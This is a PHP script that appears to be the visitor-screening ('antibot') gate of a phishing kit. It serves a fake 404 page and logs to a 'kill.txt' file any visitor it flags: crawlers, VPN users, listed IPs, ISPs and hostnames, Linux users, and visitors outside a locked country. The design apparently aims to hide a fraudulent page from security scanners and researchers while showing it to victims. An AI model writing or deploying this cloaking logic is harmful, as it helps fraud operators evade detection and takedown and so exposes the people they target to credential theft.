<?php

    if (file_exists('./Meta/Comp.php')) {
        require_once './Meta/Comp.php';
        require_once './Meta/Antibot.php';
        require_once './Meta/Python/autoload.php';
    } elseif (file_exists('../Comp.php')) {
        require_once '../Comp.php';
        require_once '../Antibot.php';
        require_once '../Python/autoload.php';
    } elseif (file_exists('../Meta/Comp.php')) {
        require_once '../Meta/Comp.php';
        require_once '../Meta/Antibot.php';
        require_once '../Meta/Python/autoload.php';
    } else {
        require_once '../../Meta/Comp.php';
        require_once '../../Meta/Antibot.php';
        require_once '../../Meta/Python/autoload.php';
    }

    use Jaybizzle\CrawlerDetect\CrawlerDetect;

    $comps = new Comp;
    $antibot = new Antibot;
    $spider = new Spider;
    $crawler = new CrawlerDetect;

    if (
        !$comps->localhost($_SESSION['ip']) &&
        !$comps->WL($_SESSION['ip'])
    ) {
        if (
            $comps->getOS() == "Windows 95" ||
            $comps->getOS() == "Windows 98" ||
            $comps->getOS() == "Windows ME" ||
            $comps->getOS() == "Windows 2000" ||
            $comps->getOS() == "Windows Server 2003/XP x64" ||
            $comps->getOS() == "Windows Vista" ||
            $comps->getOS() == "Windows XP" ||
            $comps->getOS() == "BlackBerry" ||
            $comps->getOS() == "Linux" ||
            $comps->getOS() == "Ubuntu" ||
            $comps->getOS() == "Unknown OS"
        ) {
            echo $antibot->throw404();
            if (file_exists("../Guard/Audio/kill.txt")) {
                $comps->log(
                    "../Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: OS (" . $comps->getOS() . ")\n\n"
                );
            } elseif (file_exists("../../Guard/Audio/kill.txt")) {
                $comps->log(
                    "../../Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: OS (" . $comps->getOS() . ")\n\n"
                );
            } else {
                $comps->log(
                    "./Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: OS (" . $comps->getOS() . ")\n\n"
                );
            }
            die();
        }
    
        if (
            $_SESSION['ip'] == "92.23.57.168" ||
            $_SESSION['ip'] == "96.31.1.4" ||
            $_SESSION['ip'] == "207.96.148.8"
        ) {
            echo $antibot->throw404();
            if (file_exists("../Guard/Audio/kill.txt")) {
                $comps->log(
                    "../Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: IP (3 IPs)\n\n"
                );
            } elseif (file_exists("../../Guard/Audio/kill.txt")) {
                $comps->log(
                    "../../Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: IP (3 IPs)\n\n"
                );
            } else {
                $comps->log(
                    "./Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: IP (3 IPs)\n\n"
                );
            }
            die();
        }

        if ($spider->checkSpider()) {
            echo $antibot->throw404();
            if (file_exists("../Guard/Audio/kill.txt")) {
                $comps->log(
                    "../Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Crawler (User Agent)\n\n"
                );
            } elseif (file_exists("../../Guard/Audio/kill.txt")) {
                $comps->log(
                    "../../Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Crawler (User Agent)\n\n"
                );
            } else {
                $comps->log(
                    "./Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Crawler (User Agent)\n\n"
                );
            }
            die();
        }
    
        if ($antibot->checkHost()) {
            echo $antibot->throw404();
            if (file_exists("../Guard/Audio/kill.txt")) {
                $comps->log(
                    "../Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Host (Hostname List)\n\n"
                );
            } elseif (file_exists("../../Guard/Audio/kill.txt")) {
                $comps->log(
                    "../../Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Host (Hostname List)\n\n"
                );
            } else {
                $comps->log(
                    "./Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Host (Hostname List)\n\n"
                );
            }
            die();
        }
    
        if ($antibot->checkISP()) {
            echo $antibot->throw404();
            if (file_exists("../Guard/Audio/kill.txt")) {
                $comps->log(
                    "../Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: ISP (ISP List)\n\n"
                );
            } elseif (file_exists("../../Guard/Audio/kill.txt")) {
                $comps->log(
                    "../../Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: ISP (ISP List)\n\n"
                );
            } else {
                $comps->log(
                    "./Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: ISP (ISP List)\n\n"
                );
            }
            die();
        }
    
        if (
            isset($settings['VPN']) &&
            $settings['VPN'] == "on"
        ) {
            if ($antibot->checkVPN() == "Y") {
                echo $antibot->throw404();
                if (file_exists("../Guard/Audio/kill.txt")) {
                    $comps->log(
                        "../Guard/Audio/kill.txt",
                        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: VPN (VPN API)\n\n"
                    );
                } elseif (file_exists("../../Guard/Audio/kill.txt")) {
                    $comps->log(
                        "../../Guard/Audio/kill.txt",
                        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: VPN (VPN API)\n\n"
                    );
                } else {
                    $comps->log(
                        "./Guard/Audio/kill.txt",
                        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: VPN (VPN API)\n\n"
                    );
                }
                die();
            }
        }

        if (
            isset($settings['HeuristicVPN']) &&
            $settings['HeuristicVPN'] == "on" &&
            isset(json_decode($antibot->checkHVPN(), 1)['result']) &&
            json_decode($antibot->checkHVPN(), 1)['result'] > 0.995
        ) {
            echo $antibot->throw404();
            if (file_exists("../Guard/Audio/kill.txt")) {
                $comps->log(
                    "../Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: VPN (Heuristic VPN API)\n\n"
                );
            } elseif (file_exists("../../Guard/Audio/kill.txt")) {
                $comps->log(
                    "../../Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: VPN (Heuristic VPN API)\n\n"
                );
            } else {
                $comps->log(
                    "./Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: VPN (Heuristic VPN API)\n\n"
                );
            }
            die();
        }
    
        if ($crawler->isCrawler()) {
            echo $antibot->throw404();
            if (file_exists("../Guard/Audio/kill.txt")) {
                $comps->log(
                    "../Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Crawler (Crawler Class)\n\n"
                );
            } elseif (file_exists("../../Guard/Audio/kill.txt")) {
                $comps->log(
                    "../../Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Crawler (Crawler Class)\n\n"
                );
            } else {
                $comps->log(
                    "./Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Crawler (Crawler Class)\n\n"
                );
            }
            die();
        }

        if ($antibot->ipRange($_SESSION['ip'])) {
            echo $antibot->throw404();
            if (file_exists("../Guard/Audio/kill.txt")) {
                $comps->log(
                    "../Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: IP (IP List)\n\n"
                );
            } elseif (file_exists("../../Guard/Audio/kill.txt")) {
                $comps->log(
                    "../../Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: IP (IP List)\n\n"
                );
            } else {
                $comps->log(
                    "./Guard/Audio/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: IP (IP List)\n\n"
                );
            }
            die();
        }

        if (
            isset($settings['CountryLock']) &&
            $settings['CountryLock'] != "off"
        ) {
            if (!$antibot->countryLock()) {
                echo $antibot->throw404();
                if (file_exists("../Guard/Audio/kill.txt")) {
                    $comps->log(
                        "../Guard/Audio/kill.txt",
                        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: IP (IP Location)\n\n"
                    );
                } elseif (file_exists("../../Guard/Audio/kill.txt")) {
                    $comps->log(
                        "../../Guard/Audio/kill.txt",
                        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: IP (IP Location)\n\n"
                    );
                } else {
                    $comps->log(
                        "./Guard/Audio/kill.txt",
                        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: IP (IP Location)\n\n"
                    );
                }
                die();
            }
        }
    }